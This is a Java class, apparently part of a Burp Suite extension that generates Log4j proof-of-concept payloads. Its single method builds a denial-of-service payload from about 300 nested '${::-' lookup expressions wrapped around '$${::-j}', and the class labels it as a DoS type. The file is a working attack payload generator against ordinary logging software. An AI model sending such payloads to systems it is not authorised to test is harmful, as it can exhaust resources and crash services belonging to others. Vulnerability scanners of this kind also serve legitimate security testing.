package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

public class POC14 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${" + "${::-".repeat(300) + "$${::-j}" + "}".repeat(300) + "}";

    }

    @Override
    public int getType() {
        return POC_TYPE_DOS;
    }
}
